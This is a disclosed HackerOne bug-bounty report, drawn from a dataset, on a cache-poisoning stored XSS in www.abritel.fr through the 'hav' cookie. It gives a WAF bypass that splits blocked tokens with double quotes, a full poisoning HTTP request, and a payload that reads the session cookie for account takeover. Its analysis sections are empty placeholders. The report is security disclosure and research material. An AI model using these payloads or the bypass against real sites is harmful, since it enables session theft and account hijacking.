---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1760213'
original_report_id: '1760213'
title: Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)
weakness: Cross-site Scripting (XSS) - Stored
team_handle: expediagroup_bbp
created_at: '2022-11-02T19:18:44.031Z'
disclosed_at: '2023-04-01T19:59:48.752Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 92
asset_identifier: www.abritel.fr
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Cache Poisoning Allows Stored XSS Via hav Cookie Parameter (To Account Takeover)

## Metadata

- HackerOne Report ID: 1760213
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: expediagroup_bbp
- Disclosed At: 2023-04-01T19:59:48.752Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

Report #1698316 was closed as resolved 

You told me that the stored XSS was going to be resolved since "As this relies on the same root cause, we will be closing it as duplicate", but no 


abritel.fr has a strong WAF, however the server hides double quotes, allowing to bypass the WAF

e.g

The server blocks `</script`but if I send `</sc"ript>`

WAF is bypassed and the output is </script>


## Steps To Reproduce:


1-> Send this request 

```http
GET /annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.js?xxxd HTTP/2
Host: www.abritel.fr
Cookie: hav=xss"</sc"ript><sv"g/onloa"d=aler"t"(document.doma"in)>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/signup?enable_registration=true&redirectTo=%2Fsearch%2Fkeywords%3Asoissons-france-%28xss%29%2FminNightlyPrice%2F0%3FpetIncluded%3Dfalse%26filterByTotalPrice%3Dtrue%26ssr%3Dtrue&referrer_page_location=serp
Upgrade-Insecure-Requests: 1
Te: trailers
```

2-> Using another browser visit: 

https://www.abritel.fr/annonces/location-vacances/france_midi-pyrenees_46_stcere_dt0.php.jpeg?xxxd

Exploit:

This is the payload to extract the HASESSIONV3 
xss"</sc"ript><sv"g/onloa"d=aler"t"(window.INITIAL_STATE.system.cookie)>


## Supporting Material/References:

{F2016192}

## Impact

Stored XSS to Account Takeover

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
